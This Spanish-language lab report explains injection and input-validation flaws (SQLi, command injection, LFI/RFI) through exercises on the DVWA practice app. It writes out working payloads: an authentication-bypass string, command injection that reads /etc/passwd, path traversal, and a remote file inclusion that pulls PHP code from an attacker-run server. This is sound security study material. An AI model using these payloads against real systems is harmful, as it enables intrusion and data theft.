**Documentos de Referencia:** "AWEB - Input Validation\_ SQLi - Command Injection - File inclusion.pdf"

# Informe Técnico: Vulnerabilidades de Inyección y Validación de Entrada

-----

## 1\. Resumen Ejecutivo

Este informe aborda las vulnerabilidades más críticas de **inyección** que surgen por una deficiente **validación de entrada** (`Input Validation`) en aplicaciones web. Se analizan la **`SQL Injection` (SQLi)**, la **`Command Injection`** y la **`File Inclusion`** (`LFI` y `RFI`), detallando sus mecanismos de explotación, los graves riesgos que implican y las soluciones basadas en el principio de **lista blanca** (`Allowlist`) y **consultas parametrizadas**. El contenido enfatiza la importancia de comprender la lógica del ataque, incluso al utilizar herramientas de automatización como **sqlmap**.

-----

## 2\. Conceptos Fundamentales

Las vulnerabilidades de inyección se aprovechan de la incapacidad de una aplicación para distinguir entre **datos** introducidos por el usuario y **código ejecutable** en el lado del servidor o del cliente.

### 2.1. `SQL Injection` (SQLi)

La **Inyección SQL** es una de las vulnerabilidades más críticas en aplicaciones web y se encuentra en la categoría de inyección del **OWASP Top 10**.

  * **Origen:** Surge cuando la aplicación no valida correctamente las entradas, lo que permite al atacante inyectar comandos maliciosos en una consulta SQL.
  * **Mecanismo:** La inyección se produce en el lado de la **aplicación web**, pero el ataque se ejecuta directamente en la **base de datos**, comprometiendo la información que contiene.
  * **Riesgos:** La SQLi compromete la seguridad y puede resultar en la **divulgación de información** (`Information Disclosure`), la **pérdida de disponibilidad** (ej. `DROP DATABASE`), y la **ejecución de código remoto**.
  * **Riesgo Principal:** **`Authentication Bypass`** (Omisión de Autenticación). Un atacante puede acceder a cuentas sin conocer la contraseña.

#### **Tipos de SQLi**

  * **`In-Band SQLi`:** El atacante utiliza el mismo canal para enviar el ataque y recibir la respuesta de la base de datos. La información extraída se muestra directamente en la aplicación web. Es el más común y fácil de detectar.
  * **`Error-Based SQLi`:** El atacante fuerza a la base de datos a generar un mensaje de error que revela información sobre su estructura (versión, tipo de base de datos, sintaxis).
  * **`Blind SQLi` (A Ciegas):** El más difícil de explotar. La base de datos no devuelve los resultados directamente. La información se deduce mediante preguntas de "sí o no":
      * **`Boolean-Based`:** Se observan cambios en la página si la condición inyectada es `VERDADERA` o `FALSA`.
      * **`Time-Based`:** Se utiliza una función que retrasa la respuesta de la base de datos (ej., `SLEEP`).

### 2.2. `Command Injection`

La **Inyección de Comandos** es una vulnerabilidad crítica que permite ejecutar comandos del sistema operativo (`SO`) en el servidor anfitrión.

  * **Mecanismo:** Los campos de entrada no validados son interpretados por el `SO` como comandos del `shell`.
  * **Consecuencia:** El atacante obtiene una **ejecución de `shell`** en el servidor. Los privilegios obtenidos dependen de los permisos asociados al usuario con el que se ejecuta la aplicación web (ej., `www-data` en Linux).
  * **Riesgos:** La vulnerabilidad es crítica porque garantiza la **Ejecución de Código Remoto (RCE)**, **elevación de privilegios**, **exposición de información confidencial** (ej., archivos de configuración o `/etc/passwd`), y **`pivoting`** a otros segmentos de la red.

### 2.3. `File Inclusion`

Permite a un atacante incluir un archivo y forzar su ejecución dentro de la aplicación web. Esta vulnerabilidad es extremadamente peligrosa porque puede conducir a **RCE**.

  * **`Local File Inclusion` (LFI):** El archivo inyectado está en el **servidor web** anfitrión. El mayor riesgo es la **divulgación de información sensible** (`Information Disclosure`).
  * **`Remote File Inclusion` (RFI):** El archivo inyectado se carga desde un **servidor externo** controlado por el atacante (ej., un VPS). El RFI es el camino más directo hacia la **RCE**.

-----

## 3\. Procedimientos Prácticos

### 3.1. Explotación Teórica de `SQL Injection`: `Authentication Bypass`

El ejemplo demuestra cómo un `payload` puede anular la lógica de autenticación en un formulario de inicio de sesión que usa concatenación de cadenas.

  * **Consulta Vulnerable:** `SELECT * FROM users WHERE user = 'username' AND password = 'password'`.
  * **Valores de Entrada del Atacante:**
      * Usuario: `admin`
      * Contraseña: `Test' OR '1'='1`
  * **Consulta Formada:** `SELECT * FROM users WHERE user = 'admin' AND password = 'Test' OR '1'='1';`.
  * **Análisis:** La comilla simple en el campo de contraseña cierra la comilla de la consulta original. Luego, el operador **`OR '1'='1'`** se evalúa como **verdadero** (`TRUE`), sin importar la contraseña original. Esto provoca que la base de datos devuelva un resultado válido para el usuario `admin`, eludiendo la autenticación.

### 3.2. Detección Práctica de SQLi en DVWA

#### **Detección Manual (Nivel Bajo)**

1.  **Detección `Error-Based`:** Ingresa una **comilla simple** (`'`) en el campo "User ID". Si la aplicación es vulnerable, se muestra un error de sintaxis de la base de datos (ej., en `MariaDB`), confirmando el ataque `Error-Based`.
2.  **Detección `In-Band`:** Ingresa el `payload` **`1' or '1'='1`** en el campo "User ID". La aplicación te mostrará directamente la información de todos los usuarios de la base de datos, lo que confirma una vulnerabilidad `In-Band`.
3.  **Detección `Blind SQLi`:** En la sección "SQL Injection (Blind)", se utiliza la respuesta booleana de la página:
      * **Prueba:** Ingresa un ID que no existe (ej., `6`). La página responde: "User ID is Missing from the database".
      * **Inyección:** Ingresa el `payload` **`6' or '1'='1`**.
      * **Resultado:** La página responde: "User ID exists in the database". Esto demuestra que la condición `'1'='1'` fue evaluada como **verdadera**, confirmando el `Blind SQLi`.

#### **Detección Automatizada con `sqlmap`**

Para automatizar la detección, utilizamos la herramienta **sqlmap**.

1.  **Preparación de la Petición:** Utiliza una herramienta de intercepción como Burp Suite para capturar una petición HTTP normal (ej., `User ID = 1`) y guárdala como un archivo de texto (`request.txt`).
2.  **Comando de Detección:** Ejecuta sqlmap con el siguiente comando para enumerar las bases de datos:
    ```bash
    sqlmap -r request.txt --dbs
    ```
      * **`sqlmap`**: Llama a la herramienta.
      * **`-r request.txt`**: Indica a sqlmap que lea todos los detalles de la petición HTTP desde el archivo.
      * **`--dbs`**: Parámetro para enumerar las bases de datos del sistema.
3.  **Análisis del Resultado:** sqlmap detecta automáticamente múltiples vulnerabilidades en el parámetro `id`, incluyendo `boolean-based blind`, `time-based blind`, `error-based` y `UNION query` (`In-Band`). También revela el `SO` (ej., `Linux Debian 9`) y las bases de datos (`dvwa` e `information_schema`) que encontró.

### 3.3. Explotación Práctica de `Command Injection`

El objetivo es concatenar un comando de `shell` al comando legítimo de la aplicación (`ping`).

#### **Técnicas de Concatenación**

Para ejecutar un comando inyectado después del `ping`, se usan separadores:

  * **Punto y Coma (`;`):** Ejecuta comandos de forma secuencial.
  * **Ampersand (`&`):** Ejecuta comandos secuencialmente o en segundo plano.
  * **Pipe (`|`):** Envía la salida del primer comando como entrada del segundo.
  * **Salto de Línea (`%0A`):** Engaña al `shell` para que ejecute la inyección en una nueva línea de comandos.

#### **Ejemplo 1: `Bypass` de Filtros de Caracteres (`%0A`)**

En un escenario donde los caracteres comunes (`;`, `&`) están bloqueados, el salto de línea puede evadir el filtro:

  * **Comando Inyectado:** `pwd` (muestra el directorio de trabajo).
  * **`Payload` de la URL:** `http://192.168.111.143/commandexec/example2.php?ip=127.0.0.1%0Apwd`.
  * **Análisis:** El **`%0A`** se decodifica como un salto de línea, lo que le indica al `shell` que ejecute el `pwd`.
  * **Resultado:** La aplicación ejecuta el `ping` y luego el `pwd`, mostrando la ruta `/var/www/commandexec`.

#### **Ejemplo 2: Inyección con Salida Oculta (Uso de Burp Repeater)**

En escenarios donde la aplicación no muestra la salida del comando inyectado en la página (`Ejemplo 3`), se debe usar Burp Suite.

1.  **Inyección en `Repeater`:** Se captura la petición y se envía al `Repeater`.
2.  **`Payload` de Prueba:** Se inyecta un comando con un separador (ej., `ip=127.0.0.1;whoami`).
3.  **Verificación de la `Response`:** El auditor revisa la pestaña **`Response`** de Burp (la respuesta HTTP cruda) para encontrar la salida del comando.
4.  **Resultado de Privilegios:** El resultado **`www-data`** se obtiene de la respuesta. Esto confirma que la vulnerabilidad existe y se ejecuta con los privilegios del usuario del servicio web.
5.  **Robo de Información:** El atacante puede escalar al `payload` **`ip=127.0.0.1|cat /etc/passwd`** y encontrar la información en la respuesta HTTP.

### 3.4. Explotación Práctica de `File Inclusion`

#### **Configuración de Docker (RFI)**

Para que el **RFI** funcione, la directiva **`allow_url_include`** debe estar establecida en **`On`**. Como está deshabilitada por defecto en Docker, se requieren comandos de `shell`:

1.  **Modificación de `php.ini`:**
    ```bash
    sudo docker exec dvwa sed -i "s/allow_url_include = Off/allow_url_include = On/g" /etc/php/7.0/apache2/php.ini
    ```
      * **`sudo docker exec dvwa`**: Ejecuta el comando `sed` dentro del contenedor `dvwa`.
      * **`sed -i`**: Edita el archivo directamente (`in-place`).
      * **`"s/.../g"`**: Expresión de sustitución para cambiar `Off` por `On`.
2.  **Recarga de Apache:**
    ```bash
    sudo docker exec dvwa /init.d/apache2 reload
    ```
      * **`/init.d/apache2 reload`**: Recarga el servicio Apache para aplicar el cambio de configuración.

#### **Explotación de LFI**

  * **Técnica:** **`Path Traversal`** (`../`).
  * **`Payload`:** Se usan múltiples `../` para subir al directorio raíz y encontrar el archivo `/etc/passwd`.
    ```
    localhost/vulnerabilities/fi/?page=../../../../../etc/passwd
    ```
  * **Riesgo:** Divulgación de los usuarios del sistema.

#### **Explotación de RFI**

1.  **Montar Servidor Python:** Se simula un servidor externo con un archivo PHP de prueba (ej., `php.php`).
    ```bash
    python -m http.server 8000
    ```
      * **`python -m http.server 8000`**: Convierte la máquina Kali en un servidor web temporal en el puerto 8000.
2.  **Inyección Remota:** Se inyecta la URL del servidor atacante.
    ```
    localhost/vulnerabilities/fi/?page=http://[IP_Kali]:8000/php.php
    ```
3.  **Resultado:** El servidor DVWA descarga y ejecuta el archivo remoto, mostrando la información.

-----

## 4\. Conclusiones y Puntos Clave

### Importancia y Beneficios de Seguridad

La **Validación de Entrada** es el pilar fundamental para la seguridad web. La única manera efectiva de mitigar las vulnerabilidades de inyección es mediante una validación **estricta** que siga el principio de **Lista Blanca (`Allowlist`)** en lugar de intentar bloquear lo malicioso.

  * **SQLi:** La solución definitiva es el uso de **consultas parametrizadas**.
  * **File Inclusion:** Deshabilitar la directiva **`allow_url_include`** en `php.ini` previene el **RFI**.
  * **General:** Aplicar el **Principio del Mínimo Privilegio** al usuario del servidor web (`www-data`).

### Puntos de Aprendizaje Clave

  * **Insuficiencia de Listas Negras:** Los filtros basados en **`Blacklist`** (como `str_replace` para bloquear `;` o `script`) son inherentemente inseguros y siempre pueden ser evadidos.
  * **Necesidad de Herramientas:** La explotación de ataques complejos como el **`Blind SQLi`** es inviable sin herramientas de automatización como **sqlmap**.
  * **`Authentication Bypass`:** El `payload` **`' OR '1'='1`** es un ejemplo simple pero potente de cómo una mala gestión de datos puede llevar a un bypass de seguridad.
  * **RCE y Escalada:** La inyección de comandos y la inclusión de archivos remotos garantizan la **Ejecución de Código Remoto (RCE)**, siendo el punto de partida para la escalada de privilegios y el `pivoting`.

### Relevancia Técnica

Los procedimientos aprendidos son esenciales en un entorno profesional:

  * **Metodología de `Bypass`:** La capacidad de analizar el código fuente para entender los filtros (ej., en LFI o `Command Injection`) y construir `payloads` de doble codificación o que usen **`Null Byte`** (`%00`) es una habilidad de auditoría avanzada.
  * **sqlmap como Estándar:** El uso de `sqlmap` con el método **`-r request.txt`** es el estándar de la industria para la detección y enumeración de datos.
  * **Enfoque en la Causa Raíz:** Se confirma que la vulnerabilidad de `SQL Injection` se encuentra en la **aplicación web**, no en la base de datos, y debe resolverse con una correcta **validación de entrada**.